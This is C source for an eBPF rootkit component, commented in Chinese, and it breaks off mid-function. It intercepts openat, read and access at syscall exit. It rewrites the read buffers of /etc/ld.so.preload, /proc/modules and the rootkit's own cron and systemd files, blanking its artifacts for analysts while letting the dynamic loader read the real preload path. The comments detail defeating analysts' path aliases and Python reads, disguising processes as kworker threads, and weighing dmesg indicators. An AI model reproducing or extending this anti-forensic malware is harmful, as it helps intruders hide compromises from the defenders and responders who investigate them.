/// redact.c — eBPF：改写**文件内容读取**的缓冲，补 hide_names 挡不住的检测面。
///
/// hide_names 只过滤 getdents64 的**目录枚举**；对手只要知道路径就能直接读：
///     cat /etc/ld.so.preload   ← 我们的 preload 库路径一目了然（I 表）
///     cat /proc/modules        ← ko_load 加载的 LKM 在这里露出（D3）
/// 本模块在 sys_exit 侧把这些**读缓冲**改掉。
///
/// ── 为什么一个程序能管多个系统调用 ──
/// loader 的 prog_section() 只取对象的第一个非 .text/.maps/license 段，一个模块
/// 只能有一个程序。要同时覆盖 openat/read/close，就必须挂在唯一那个"所有系统
/// 调用退出"的入口 raw_syscalls/sys_exit（本机 id=361），再用 ctx->id 分发。
/// （tc_rewrite.c 挂单一 sys_exit_read 就够，是因为它只需要 read 一个点。）
///
/// ── 为什么参数要从 task_pt_regs 取 ──
/// raw_syscalls/sys_exit 的 ctx 只有 id + ret，**没有 args[]**。sys_exit 时内核只
/// 写了 ax，di/si/dx 仍是入口值，所以在 exit 侧读它们就是本次调用的原始参数。
/// （同 hide.c / tc_rewrite.c。这条也是本模块能同时拿到 openat 的路径与 read 的
/// fd/buf 的原因。）
///
/// ── ★ I 表的核心矛盾：改写内容 = 打断我们自己的持久化 ──
/// /etc/ld.so.preload 是**动态加载器每个进程都要读**的文件 —— 我们的库就靠它
/// 无条件改写等于自毁 preload 持久化。实测（strace）三者的序列是：
///     ld.so:  access("/etc/ld.so.preload", R_OK) = 0
///             openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_CLOEXEC)
///     cat:    openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY)
///     python: openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_CLOEXEC)
/// 判据 = **「本进程刚 access 探测过它」AND「这条 openat 带 O_CLOEXEC」**：
///   · 只有加载器会先探测存在性（探测失败它就不开）；工具不会 —— 工具进程里
///     那次 access 是 ld.so 干的，旗标早被它消费掉了。
///   · 单看 O_CLOEXEC 分不开加载器和工具：python 的 `os.open()` **也带**
///     （本文早期注释断言它"不带"，实测证伪 —— 这一条错判让 T1/T2c/T3 四个
///     用例全红，且是产品级缺陷：现实里分析员用 python 读 preload 会被放行）。
///   · 单看探测又挡不住 `access()+open()` 这种工具写法。
/// 两条同时成立才放行 → 加载器读到真实路径（库照常加载），其余**任何工具路径**
/// 都被改写；改写等长（命中词填空格），文件本体一个字节都不动。
///   ⚠️ 已知边界：判据是启发式，不是"调用者是谁"。先 access(R_OK) 再
///   open(...|O_CLOEXEC) 的工具会被误放行（已知、接受）；静态链接进程没有
///   ld.so → 它自己的 open 一定被改写（这是正确行为）。
///
/// ── 匹配规则（两种文件统一成一条）──
/// 对窗口内**每个位置** p：若 p 是**词首**（p==0 或前一字节是分隔符）且
/// tmp[p..p+len) 命中 hide_names 里某个 key（len = 该词长度），就把这 len 个
/// 字节填空格。
///   preload：一行就是一条库路径 → 词 = 整行内容，抹掉即整行变空。
///   modules：一行的**首个 token** 是模块名，其余字段（size/引用计数/地址）是
///            动态值、无法预置 → 词 = 模块名，抹掉即名字消失。
/// **只抹词、不抹整行**：大小 / 行数 / 其余字段全部原样 —— 比"半截行"更难被
/// 字段数校验、长度基线、`awk '{print $2}'` 这类读法发现。留一个空行反而更怪。
///   ⚠️ 写进 hide_names 的必须是**文件里字面出现的文本**，且长度 ≤ AX_WORD：
///     execute bof ebpf_load.o redact.insns.bin redact.mapreloc.txt 5 1 \
///             raw_syscalls/sys_exit "/lib/x86_64-linux-gnu/libm.so.6" "" <key16> <pin>
///
/// ── ★★ 扫描循环为什么必须长成现在这样（实测约束，抄自 tc_rewrite.c 头部）──
/// verifier 有两个**互相拉扯**的预算：「跳转序列复杂度」（push_stack 的 8192 待
/// 处理状态上限，报 "The sequence of 8193 jumps is too complex."）和 「指令处理
/// 上限」（1000001 insn）。下面这个形状是实测唯一同时满足两者的：
///   ① **点 5：LLVM 把 `a == b` / `a < b` 编成分支** —— 哪怕写在按位 `&` 链里。
///      所以本文一切比较只用 ax_iszero/ax_lt —— **纯移位 + 减法**，LLVM 变不成
///      跳转。（`(j < ll) ? c : 0` 这种"看起来无分支"的三元是假的：它会编成
///      "跳 + 两个赋值"，两条路径状态不同 → join 处不合并。）
///   ② **点 7：跨迭代标量 = 致命**。"上一次见到的换行位置"这类游标会被 verifier
///      逐迭代精确跟踪，两个到达循环头、游标值不同的状态**永不合并** ——
///      tc_rewrite 实测"这一条就足以让每一种窗口大小都顶在 1000001 指令上限"。
///      本文因此**不保存任何跨迭代游标**：词首判定只看局部 tmp[p-1]，词长由
///      **全展开**的内层循环就地算出（展开后没有循环头，也就没有"两个状态在
///      循环头相遇"这回事）。
///   ③ **点 2：扫描循环的每个 `break` 出口都产生一个 verifier 状态**，且每个这样
///      的状态都要把**剩余全部程序**再走一遍。所以内层"找词尾"绝不能用
///      `for (j…) if (…) break;` —— 改成位掩码累积（run）。
///      本文也**没有两趟**（先数行、再逐行）：那种"按行解析"同样要靠符号次数的
///      break 才能结束，等于把点 2 又请回来。
///   ④ **点 6：lookup 留在命中判定之内**，不要提到循环外；提到外面会让每个位置
///      都留下两个活状态（指针 vs 标量）而永不合并，实测把走查从 62k 直接顶到
///      1000001 指令上限。本文的形状：标量词首判定 → 分支 → 建 key → lookup →
///      分支 → 写回；两层分支的两侧在汇合处都只剩标量。
///   ⑤ **点 4：helper 的 size 参数必须是常量**（verifier 只看指令的 tnum）。
///      所以写回粒度 AX_CHUNK 是**常量**，不是变量（变量长度要么被拒，要么让
///      "零长度读"这类判据无法可证）。
///   ⑥ 内层 32 步 `#pragma unroll`（**必须展开**，否则循环头又成跨迭代状态相遇
///      点）；外层位置循环 `#pragma clang loop unroll(disable)`（**必须不展开**，
///      展开会让 push_stack 溢出）。
///
/// ── 扫描窗口为什么这么定 ──
///   · 两种目标都**从读缓冲的头部**取 AX_SCAN 字节：
///     – /etc/ld.so.preload 极小 → 首窗即全文；
///     – /proc/modules 是**新在前**（实测：`insmod` 后新模块出现在第 1 行，
///       末行是开机就在的老模块）→ 我们登记的就是"刚加载的那一个"，必在首窗。
///   ⚠️ 这里原来写的是"后加载的排在末尾（内核 list_add_tail）→ 从 ret-AX_SCAN
///   起扫尾部"。**方向写反了**，后果是：`cat /proc/modules` / `lsmod` 用的大缓冲读
///   （ret≈4096）下窗口只覆盖最老的那几个模块，要藏的名字根本不在窗口里 ——
///   名字原样可读；反倒是把读缓冲开到 ≤128 的读者（`ret <= AX_SCAN` 时不发生
///   偏移）会整块被扫到，于是 p15 的 D3 长期全绿。**"测试用的读法"与"对手用的
///   读法"不同，判据就测不到真实检测面**（p22 T5 用 `cat` 才把它暴露出来）。
/// 越界可证性：位置循环的界是 `p + AX_CHUNK <= n`，且 n <= AX_SCAN <= AX_TMP →
/// tmp[(p+j) & (AX_TMP-1)] 与 tmp[(p-1) & (AX_TMP-1)]（p==0 时落到尾部，已清零）
/// 全在 tmp 内；写回锚点再钳一次 `w = min(p, n-AX_CHUNK)` → [w, w+AX_CHUNK) ⊆
/// [0, n)，绝不写出内核已读回的字节。
///
/// ── 与 tc_rewrite 的关系（都是 read 改写，但互不干扰）──
/// tc_rewrite 挂 syscalls/sys_exit_read 处理 /proc/net/tcp，靠**内容格式特征**
/// 识别；本模块挂 raw_syscalls/sys_exit，靠 openat 记下的 fd 识别。两个
/// tracepoint 都会触发，但各自只碰自己认得的 fd/buffer，不冲突。
///
/// ── 已知边界（有意接受）──
/// · 词长 > AX_WORD(32) 的名字匹配不到（key 只填前 32 字节）—— 名字由我们定，避开即可
/// · read 返回值 n <= 0 时才整窗放弃 —— ISS-083 把门槛从 `n < AX_CHUNK(32)` 放开：
///   `/etc/ld.so.preload` 最常见的形态就是"只有我们写的一行短路径"（19 字节），
///   旧门槛让内容层对**最需要它的那个形态** 100% 不设防。写回长度现在由 n 本身
///   给出（9.5-① 之后是整块写回 [0, n)），天然落在**已返回的**字节内
/// · mmap 读绕过本 hook（read hook 的固有边界，见 tc_rewrite 的 WHY）
/// · 跨扫描窗口边界的残词匹配不到（窗口内完整成词的才处理）
/// · **9.5-① 判定：不做**（"把写回提出 p 循环 / 就地累积"）。这条路在 verifier 上
///   是**死的**，且收益在有界侧：
///   ① **verifier 硬证据**：原写法能过恰恰因为 bpf_probe_write_user 的 dst 是
///      **用户指针**（ARG_ANYTHING）⇒ verifier 不跟踪 ⇒ 96 次迭代的循环头状态能
///      合并；改成写**栈副本 tmp**（偏移随 p 变）后，每迭代写到的栈槽位不同 ⇒
///      栈状态指纹逐迭代不同 ⇒ 循环头状态永不合并 ⇒ 实测
///      `Processed 1000001 insn`（max_states_per_insn 48 / total_states 19587）。
///      ⇒ **这条纪律比本次改动值钱：ax_scan 里任何"写内存"的目标都必须留在
///      用户侧；换成栈（尤其变偏移）就是 1000001。**
///   ② **收益侧**：10 行 → ~2 行，而本机已有 1840 行同类告警 + suppressed 上万
///      ⇒ 信噪比上不可见；taint 位与调用点本身都还在 ⇒ 检测面不变。
///   ⇒ 真实对策是**减少加载次数**（redact 一次部署只加载一次），不是压行数。
/// · **dmesg 那行告警是本模块最硬的 IOC 之一，但两条性质必须读对**：
///   ① 来自 `bpf_get_probe_write_proto()`，由 **verifier** 在解析该 CALL 的原型时
///      打，`pr_warn_ratelimited`（突发 **10 行 / 5 秒**）⇒ 行数 ∝ **到达该 CALL 的
///      状态数**、且**被截顶**，不能当"调用次数"读。实测：redact（调用点在 96 次
///      循环内）Δ=10 行 & 同窗口 `suppressed 10718`；bpf_filter（直线代码，同样
///      1 个调用点）Δ=2 行。9.5-① 把调用点提出循环就是压这个数。
///   ② 它印的是 `current->comm` ⇒ 落到我们**伪装过的 argv 名**上（实测
///      `kworker/0:0H-e` / `rcu_tasks_rude`），**不泄漏真实载荷名**。
///   ★ 三条**做不到**（不是"没做"）：`taint` 位不可清除（实测 12288 恒定）；
///   `bpf_probe_write_user` 在内核里**无替代品**；ring buffer 本体在内核内存里，
///   而这个 helper 只写**用户**内存 ⇒ 抹不掉。⇒ 唯一真实对策是**减少加载次数**。
/// · **类A** 整块抹平只覆盖前 AX_HIDE_CAP(512) 字节，更长的文件尾部原样残留
/// · **类A** 把换行也抹成空格 → 行数与真身不同（**字节数不变**）；preload/modules
///   走的是"只换词、保留换行"的 ax_scan，不受这条影响
/// · **类A** 闸门对路径 ≥63 字符的文件不生效（尾分量看不全 → 放弃，宁漏不误）
/// · 抹掉的是**词**不是整行 → `cat /proc/modules` 那行的名字位置变成空格，
///   行数 / 字节数 / 其余字段一个不动
/// · 想让整行**真的消失**必须缩短 read 返回值，而这已在 Phase 2a 实测证伪：
///   kretprobe 在返回时拿不到入口参数（PT_REGS_PARM1 = NULL），且
///   bpf_probe_write_user 对内核地址返回 -EFAULT —— BPF 无法写内核内存，
///   改不了 pt_regs 里的返回值。详见 tc_rewrite.c 头部。
/// · D3 只对 `/proc/modules` 生效；`/sys/module/*` 目录枚举要另外走 hide_names。
///
/// ── ★ 类A 闸门（P9-9.1）：从"两个写死的名字"到"整张 hide_names" ──
/// 原来的闸门是 `ax_tail_preload()` / `ax_tail_modules()` 两个**写死的**判据，于是
/// 内容层只有这两个文件被改写。可 hide_names 里早就装着别的产物名（cron 的 job 名、
/// systemd 的 unit 名）—— 它们**列不出来、却 cat 得到**，这正是 P9 §2b 认的最大缺口。
/// 补法是**复用**而非新增：`ax_hidden_basename()` 按"路径最后一个分量"查
/// hide_names（键形状与 hide.c / ax_scan 逐字节一致：dirent 基名零填充到 64），
/// 命中即记 `AX_KIND_HIDE`，read 时整块抹平 —— 零新 map、零新播种、零新 pin，
/// 内核侧可观测面一个字节未变（B10 的枚举面判据不受影响）。
/// 顺序：preload → modules → 类A，所以 `/etc/ld.so.preload`（基名也在表里）仍走
/// PRELOAD 的选择性抹平，行为与改动前**逐字节相同**。
/// ★ 附带收益：以后任何新的 AxHideNameAdd 调用者白拿内容层保护 —— 同一条不变量
/// （ISS-071/072）不必再在第三、第四个落点上手写一遍。

#include "common.h"

/* ── 架构常量 ── */
#if defined(__TARGET_ARCH_x86)
# define AX_NR_READ    0
# define AX_NR_CLOSE   3
# define AX_NR_OPENAT  257
# define AX_NR_OPEN    2       /* ★ x86_64 独有（ISS-054）：`open` 与 `openat` 是**两条
                                *   不同的 syscall**，只挂 openat 时直调 open(2) 的程序
                                *   （静态链接 / musl / 直调 syscall / 我们自己的
                                *   AxReadFileToBuffer）读 preload 完全不被改写 */
# define AX_NR_ACCESS  21      /* access(path,mode)：path 在 di */
# define AX_ACCESS_REG di
# define AX_OPEN_PATH_REG  di  /* open(path,flags,mode) 与 openat(dirfd,path,...) 的
                                *   参数位置不同：open 的 path 在 di、flags 在 si */
# define AX_OPEN_FLAGS_REG si
#elif defined(__TARGET_ARCH_arm64)
# define AX_NR_READ    63
# define AX_NR_CLOSE   57
# define AX_NR_OPENAT  56
# define AX_NR_OPEN    AX_NR_OPENAT   /* arm64 **没有** open(2)：sys_open 就是 openat。
                                       * 定义成同一个号 → 下面那段可以无条件共用，
                                       * 在 arm64 上它退化成原来的单分支 */
# define AX_NR_ACCESS  48      /* arm64 无 access：走 faccessat(dirfd,path,mode)，path 在 si */
# define AX_ACCESS_REG si
# define AX_OPEN_PATH_REG  si
# define AX_OPEN_FLAGS_REG dx
#else
# error "redact.c: unsupported target arch"
#endif
#define AX_O_CLOEXEC   0x80000

#define AX_NAME_LEN    64      /* hide_names 的 key 长度：契约，勿改 */
#define AX_THREAD_SIZE 16384
#define AX_SCAN        128     /* 扫描窗口：读缓冲**头部**看这么多字节（见文件头） */
/* 类A 整块抹平的覆盖上限。为什么必须**大于** AX_SCAN：AX_SCAN 是"在共享文件里找词"
 * 的窗口，看得见就够；而整块抹平的目标是"把这个文件读成空白"，漏掉的尾部会**原样
 * 泄漏**。我们写出的产物实测：cron 行 ~30-60 字节、systemd unit ~250 字节 ⇒ 512 留了
 * 一倍余量。更大的文件尾部仍会残留（已知边界，见文件头）。 */
#define AX_HIDE_CAP    512
#define AX_TMP         128     /* 栈缓冲。两条不变量：
                                *   ① 必须是 2 的幂 —— 索引靠 & (AX_TMP-1) 钳，无分支
                                *   ② 必须 >= AX_SCAN —— 位置循环读到 tmp[p+AX_WORD-1]，
                                *      而 p <= n-AX_CHUNK <= AX_SCAN-AX_CHUNK
                                * 栈上限只有 512：tmp 每多 128 字节，展开后的溢出就多一截。 */
#define AX_WORD        32      /* 参与比对的词长上限（= 内层展开步数） */
#define AX_CHUNK       AX_WORD /* ★ 写回粒度，**常量**（点 4）。必须 == AX_WORD：
                                * sp[] 由同一个展开循环写满，两个数一分开就越界 */

/* fd 状态表：key = (pid << 32) | fd → 种类。
 * 索引 7：0..5 是 rootkit 契约 map，6 被 loader 私有的 trace_fds 占用。
 * ⚠️ 三处必须一致：common.h 的声明 / tools/build_bpf.sh 的 ax_map_index() /
 *    bofs/ebpf_load.c 的建图段。 */
#define AX_KIND_MODULES 1
#define AX_KIND_PRELOAD 2
/* ★ 类A：「文件本身就是我们的产物」（/etc/cron.d/<job>、/etc/systemd/system/<unit>…）。
 * 它「列不出来」由 hide_names 的 getdents64 过滤做到，「读不到」由本模块补 ——
 * 「列不出但读得到」这道鸿沟就填在这里。
 * 与 PRELOAD 的语义区别：不是"从共享文件里抹掉我们的那几行"，而是**整块抹平**，
 * 因为整个文件都是我们造的。 */
#define AX_KIND_HIDE   4
/* access(2)：ld.so 开 preload 之前**一定**先探测存在性（strace 实证：
 *   access("/etc/ld.so.preload", R_OK) = 0
 *   openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_CLOEXEC) = 3
 * 而工具（cat / python / 内建 open）**没有自己的探测** —— 那次 access 是 ld.so 干的。 */
#define AX_NR_ACCESS   21
/* 旗标复用 redact_fds（索引 7）：key 尾取一个真实 fd 不可能等于的值 → 不新增 map，
 * 也就不新增 pin 对象（BPF 侧可观测面越小越好）。 */
#define AX_PROBE_FD    0xFFFFFFFFu
#define AX_KIND_PROBE  3        /* 读写分支只认 1/2 → 旗标天生不会被误当成 fd 状态 */

/* ── ★ 无分支原语（点 5）──
 * 只用移位与减法，LLVM 无法降成分支。语义成立范围 x、n < 2^31（本文件所有入参
 * 都满足：u8 值 / 有界窗口位置 / 有界长度）。 */
static __always_inline __u32 ax_iszero(__u32 x)
{
    __u32 d = x - 1u;
    asm volatile("" : "+r"(d));     /* ★ 屏障：LLVM 看不见 d 的来源，无法还原成 `x == 0` 分支 */
    return d >> 31;
}   /* 1 iff x == 0 */
static __always_inline __u32 ax_lt(__u32 x, __u32 n)
{
    __u32 d = x - n;
    asm volatile("" : "+r"(d));     /* ★ 同上：阻止 LLVM 还原成 `x < n` 分支 */
    return d >> 31;
}

/* 定长常量串比较：全展开 + 位或累积 → 零分支（点 5）。
 * 早期写成 `for (i<n) if (s[i]!=w[i]) return 0;`，n 个提前 return 就是 n 条路径。 */
static __always_inline __u32 ax_streq(const char *s, const char *w, int n)
{
    __u32 d = 0;

    #pragma unroll
    for (int i = 0; i < n; i++)
        d |= (__u32)(__u8)s[i] ^ (__u32)(__u8)w[i];
    return ax_iszero(d);
}

/* ── ★ 路径判据：比较**尾部分量**，而不是整串字面（ISS-055）──
 *
 * 字面比较（`ax_streq(p, "/etc/ld.so.preload", 19)`）有一个廉价到离谱的绕过：
 *
 *     /etc/ld.so.preload      ← 只有这一种写法和它对得上
 *     /etc//ld.so.preload     ← 多一个斜杠 → 字面不等 → 不记表 → 读到真内容
 *     /etc/./ld.so.preload    ← 同上
 *     ld.so.preload           ← cwd=/etc 时的相对写法，同上
 *
 * 这四种写法**解析后是同一个文件**。实测（tools/p16_alias_probe.py：同一次运行、
 * 同一个进程、同一个文件）：规范路径被抹成空格，其余四种**全部读到真 preload**。
 * 判据再准也没用 —— 对手只要多敲一个字符就绕过去了。
 *
 * 新判据 = 「路径的最后一个分量 == 目标名」：
 *   · 中间段**完全不看** → `//`、`/./`、`/../`、相对路径全部自动命中；
 *   · 代价是 `/tmp/ld.so.preload` 这类"别处的同名文件"也会被改写 —— 那恰恰是
 *     对手把文件拷出来再读的常见形态，认了比漏了强；这个文件名系统里唯一。
 *
 * 全程定长展开 + 位或累积，无分支（点 5）。
 *
 * ★ 三个坑，全都是**静默失效**（编译过、看着对、就是不生效）：
 *   · 词长由 `sizeof(W)-1` 算，不手写（手写 14 vs 真值 13 的教训见上）；
 *   · 「整串就是它」（相对路径）那条**必须排在逐字节比较之后** —— 排在前面等于不比
 *     内容就认账，凡与目标等长的路径全中招（`/etc/hostname` 与 "ld.so.preload" 同为
 *     13 字符）；
 *   · **变长偏移不许索引栈缓冲**。第一版把整条路径读进 `p[32]` 再 `s[n-wl+i]` 去比，
 *     被 verifier 一句 `invalid unbounded variable-offset read from stack` 打回：
 *     clang 为零扩展 32 位下标生成的 `<<=32; >>=32` 把 [0,31] 的界丢成了
 *     [0,0xffffffff]，越过 BPF_MAX_VAR_SIZ。**判据本身没错，是取数方式被禁**。
 *     现在变长偏移只出现在**用户指针**上（scalar，随便加），落栈一律常量偏移。 */
#define AX_PL_WORD "ld.so.preload"
#define AX_MD_WORD "modules"
/* ★ 长度**不许手写**。第一版把 "ld.so.preload"（13 字符）写成 14 —— 编译通过、
 * verifier 通过，判据却**永远不命中**（`n == 14` 只对 14 字符的路径生效，而真身是
 * 13）。手写长度的失效是**静默**的：症状与"根本没改"逐字节相同。 */
#define AX_PL_WLEN ((__u32)(sizeof(AX_PL_WORD) - 1))
#define AX_MD_WLEN ((__u32)(sizeof(AX_MD_WORD) - 1))

/* 路径长度**不去数**：`bpf_probe_read_user_str` 的返回值就是"含 NUL 的写入长度"
 * （只有负值才是错误）。最早写过一个 32 步的零分支 ax_len32 去自己数，clang 直接
 * 报 "BPF stack limit is exceeded" 并把行号指到它的循环体上 —— 32 步展开的活跃
 * 变量（n / done / z）把寄存器打满、溢出到栈，而本文件的栈本来就贴着 512 上限
 * （read 分支还有 tmp[AX_TMP=128] 要展开）。
 *
 * 于是判据函数的入参 n 由调用点从 helper 返回值取，并**限在 [0,31]**：
 * `pn > 31u` 那条既是真检查（超过缓冲就没有"尾部"可言），也是 verifier 唯一
 * 能拿到 s[n-WL+i] 变长索引上界的地方。
 *
 * ★ 但这条闸门**只罩这两个 AX_TAIL_FN**（它们靠 n 定位尾部），**不是**整个
 * open 分支的早退：类A 的 /etc/systemd/system/<name>.service 是 33 字符，早期
 * 版本把它一起挡在门外 ⇒ systemd 一族静默不生效（实测）。见 open 分支里
 * 那段"长度闸门只能罩住 preload/modules"。 */

#define AX_TAIL_FN(fn, W)                                                  \
static __always_inline __u32 fn(const void *s, __u32 n)                    \
{                                                                          \
    const __u32 wl = (__u32)(sizeof(W) - 1);      /* 13 / 7，编译期常量 */       \
    char t[16];                                   /* 定长栈槽，>= wl */         \
    char c;                                                                \
    __u32 d = 0;                                                           \
    if (n < wl)                                                            \
        return 0;                                                          \
    /* ★ 变长偏移只在**用户指针**上做；落栈的每次读写都是常量偏移。                                   \
     * 反过来（先读进栈、再按变长偏移索引栈）verifier 直接拒绝。 */                                \
    if (bpf_probe_read_user(t, wl, (const void *)((const char *)s + n - wl))) \
        return 0;                                                          \
    _Pragma("unroll")                                                      \
    for (int i = 0; i < (int)(sizeof(W) - 1); i++)                         \
        d |= (__u32)(__u8)t[i] ^ (__u32)(__u8)(W)[i];                      \
    if (!ax_iszero(d))                                                     \
        return 0;                    /* 尾部不是那个词 */                         \
    if (n == wl)                     /* ★ 比较之后才认「整串就是它」 */                 \
        return 1;                    /* 相对路径（cwd=/etc 时的裸文件名） */           \
    if (bpf_probe_read_user(&c, 1, (const void *)((const char *)s + n - wl - 1))) \
        return 0;                                                          \
    return ax_iszero((__u32)(__u8)c ^ (__u32)'/');                         \
}                                    /* 前一个字符是 '/' → 是完整分量 */

AX_TAIL_FN(ax_tail_preload, AX_PL_WORD)
AX_TAIL_FN(ax_tail_modules, AX_MD_WORD)

/* ── ★★ 类A 闸门（P9-9.1）：路径的**最后一个分量**是否登记在 hide_names 里 ──
 *
 * 为什么要它：原来的闸门只有 ax_tail_preload()/ax_tail_modules() 两个**写死的**
 * 判据，于是内容层只覆盖这两个文件。可 hide_names 里早就装着别的产物名（cron 的
 * job 名、systemd 的 unit 名）—— 它们**列不出来，却 cat 得到**。
 *
 * 补法是**复用**而不是新增：键的形状与 hide.c / ax_scan 逐字节一致（dirent 基名、
 * 零填充到 64），所以**同一个键同时服务枚举层与内容层** —— 零新 map、零新播种、
 * 零新 pin，内核侧可观测面一个字节没变。
 * ★ 附带收益：以后任何新的 AxHideNameAdd 调用者**白拿内容层保护** ——
 * ISS-071/072 那条不变量（"落点在 N 处 ⇒ 必须是表+断言，不能 N 处手写"）从此在
 * 内容层自动成立，不必再手写第三个、第四个文件名。
 *
 * 三个坑，全是本文件交过学费的：
 *   · 找最后一个 '/' 必须用**展开的常量下标**（pp[i]，i 是编译期常量）——
 *     变长偏移的栈索引被 verifier 一句 invalid unbounded variable-offset 拒掉（ISS-055）。
 *   · 键槽 kk 必须由 **helper** 写：map key 的栈槽会被标 precise 并沿赋值链回溯，
 *     一旦键的字节经过掩码/累积运算，循环头状态永不合并（点 7，实测 1000001）。
 *   · 长度不手写、不假设：sl 由 helper 返回（含 NUL 的写入长度）。
 *
 * 已知边界：路径 ≥ sizeof(pp)-1 = 63 字符时放弃（尾分量已看不全）。
 * 实测覆盖：/etc/cron.d/<job>（~28）、/etc/systemd/system/<n>.service（到 ~62）✓
 * 运行期代价：每次 open 多一次 ≤64 字节的路径读 + 一次 map lookup（冷路径才有比对）。 */
static __always_inline __u32 ax_hidden_basename(const void *pathp)
{
    char pp[64];
    char kk[64];
    int sl, i;
    __u32 last = 0;

    __builtin_memset(pp, 0, sizeof(pp));
    sl = (int)bpf_probe_read_user_str(pp, sizeof(pp), (void *)pathp);
    if (sl <= 0 || sl >= (int)sizeof(pp))
        return 0;                       /* 读失败 / 路径 >= 63 字符 → 放弃 */
    /* 从尾往头找最后一个 '/'：命中即 break，运行期只走 basename 那几步。
     * i 展开成编译期常量 ⇒ pp[i] 是**常量偏移**栈读。 */
    #pragma unroll
    for (i = 63; i >= 0; i--) {
        if ((__u32)i < (__u32)(sl - 1) && pp[i] == '/') {
            last = (__u32)i + 1u;
            break;
        }
    }
    if (last >= (__u32)(sl - 1))
        return 0;                       /* 以 '/' 结尾（目录）或空分量 */
    __builtin_memset(kk, 0, sizeof(kk));
    /* 变长偏移只出现在**用户指针**上（pathp + last），落栈一律常量偏移。 */
    if (bpf_probe_read_user_str(kk, sizeof(kk), (const char *)pathp + last) < 0)
        return 0;
    return bpf_map_lookup_elem(&hide_names, kk) != 0;
}

/* ── 豁免判据（原样搬进来，**判据一字未改**）──
 * 「本进程刚 access 探测过它」**AND**「这条 open 带 O_CLOEXEC」。
 * 只看 O_CLOEXEC 分不开加载器和工具 —— coreutils / python 的 open 一样带它
 * （实测 strace：os.open 与 ld.so 逐字节同形）；只看探测又挡不住 access()+open()
 * 这种工具写法。两条同时成立才放行，且**一次性消费**掉旗标。
 * 抽出来的唯一理由是它现在有两个调用点（preload 与类A），不是判据变了。 */
static __always_inline __u32 ax_exempt(__u64 id, __u64 flags)
{
    __u64 pkey = ((__u64)(__u32)(id >> 32) << 32) | AX_PROBE_FD;
    __u8 *flagp = bpf_map_lookup_elem(&redact_fds, &pkey);

    if (flagp && *flagp == AX_KIND_PROBE && (flags & AX_O_CLOEXEC)) {
        bpf_map_delete_elem(&redact_fds, &pkey);
        return 1;
    }
    return 0;
}

/* Address of the current task's pt_regs (top of its kernel stack). */
static __always_inline struct pt_regs *ax_pt_regs(void)
{
    struct task_struct *t = bpf_get_current_task_btf();
    void *stack = NULL;

    if (!t)
        return NULL;
    if (bpf_probe_read_kernel(&stack, sizeof(stack), &t->stack) != 0)
        return NULL;
    if (!stack)
        return NULL;
    return (struct pt_regs *)((char *)stack + AX_THREAD_SIZE) - 1;
}

/* ── 扫描核心 ──
 * 形状见文件头"★★ 扫描循环为什么必须长成现在这样"。三处硬约束别动：
 *   · 内层 `#pragma unroll`（消除跨迭代状态相遇点，点 7）
 *   · 外层 `#pragma clang loop unroll(disable)`（push_stack 8192 上限）
 *   · 一切比较走 ax_lt/ax_iszero（点 5），lookup 留在分支内（点 6）
 *   · ★ 点 7（本模块实测新增）：**map key 的字节必须"无溯源"**。
 *     lookup 的 key 栈槽会被 verifier 标 precise 并沿赋值链回溯；
 *     只要 key 的某个字节经过了"掩码/累积"运算（mm ← run ← p），
 *     每个位置的精度位都不同 → 循环头状态永不合并 → processed 撞 1000001。
 *     修法：掩码照做，但把结果先写进 km[]，再用 helper 拷进 kb[] ——
 *     helper 写栈无寄存器溯源，回溯链断在 helper 处。实测 1000001 → 通过。 */
static __always_inline void ax_scan(char *tmp, int n, __u8 *dst)
{
    int lim = n - AX_CHUNK;

    /* ★ ISS-083：短文件（n < AX_CHUNK）时把 lim 钳到 0 ⇒ 只扫 p=0。
     * 原值会是负数，转 __u32 后变成**巨大值**，于是 `run` 里那道
     * "p 超出可用范围就作废"的闸门整个失效 —— p 会一路扫到 AX_SCAN-AX_CHUNK，
     * 从清零区（read 分支已 memset）构造出全零候选词去查 hide_names。
     * 它确实不命中（AxHideNameAdd 拒绝空名 ⇒ 表里没有全零 key），
     * 但"不越界"不该建立在"表里恰好没有某个 key"之上。 */
    if (lim < 0)
        lim = 0;

    #pragma clang loop unroll(disable)
    for (int p = 0; p < AX_SCAN - AX_CHUNK; p++) {
        unsigned char raw[AX_CHUNK];
        unsigned char km[AX_NAME_LEN];
        char kb[AX_NAME_LEN];
        __u32 run = 1u - ax_lt((__u32)lim, (__u32)p);
        __u8 *res;

        bpf_probe_read_kernel(raw, AX_CHUNK, (void *)(tmp + p));

        #pragma unroll
        for (int j = 0; j < AX_WORD; j++) {
            unsigned char c  = raw[j];
            __u32 end = ax_lt((__u32)c, 33u);
            unsigned char mm, cm;

            run = run & (1u - end);
            mm  = (unsigned char)(0u - run);
            /* ★★ ISS-084：`,`(44) 只从**键**里剔掉。
             * 依赖列的每一项后面都跟着逗号，所以名字提取出来是 `"tcp_diag,"`，
             * 与登记键 `"tcp_diag"` 不等 ⇒ 查表不中。
             * ★ 值在**寄存器**里从 c 现算：`run` 是循环携带量，给它多挂一维精度、
             *   或回读 km[j]（栈回读会被发全新唯一 id），都会让 p 循环头状态
             *   永不合并 —— 两次实测都是 `Processed 1000001 insn`。
             * ★ `raw` 不动：`,` 落在抹平区内（44 >= 33 ⇒ run 在逗号处还活着），
             *   命中时 `"tcp_diag,"` 整 9 字节一起变空格，依赖格自然是整格空白。 */
            cm  = (unsigned char)(0u - ax_iszero((__u32)c ^ 44u));
            km[j]  = (unsigned char)(c & mm & (unsigned char)~cm);
            raw[j] = (unsigned char)((' ' & mm) | (c & (unsigned char)~mm));
        }
        #pragma unroll
        for (int j = AX_WORD; j < AX_NAME_LEN; j++)
            km[j] = 0;

        /* ★★★ 本文件最贵的一行（真凶实测）：map key 的字节必须"无溯源"。
         * verifier 为安全剪枝要把 ARG_PTR_TO_MAP_KEY 的栈槽标 precise，
         * 并沿  kb ← km ← mm ← run ← p  回溯；一旦把 (c & mm) **直接**写进 kb，
         * 每个位置的精度位都不同 → 循环头状态永不合并 → processed 撞 1000001。
         * 实测对照（同一 32 步展开、同一 96 次迭代，只改这一处）：
         *   kb[j] = c & mm      → 1000001（m39）
         *   kb[j] = c（不掩码） → 通过 741（m41，但丢了"名字后补零"语义）
         *   helper 把 km 拷进 kb → 通过（km 的槽位由 helper 写入，无寄存器溯源，
         *                          回溯链在此断开，且语义逐字保留） */
        bpf_probe_read_kernel(kb, AX_NAME_LEN, km);

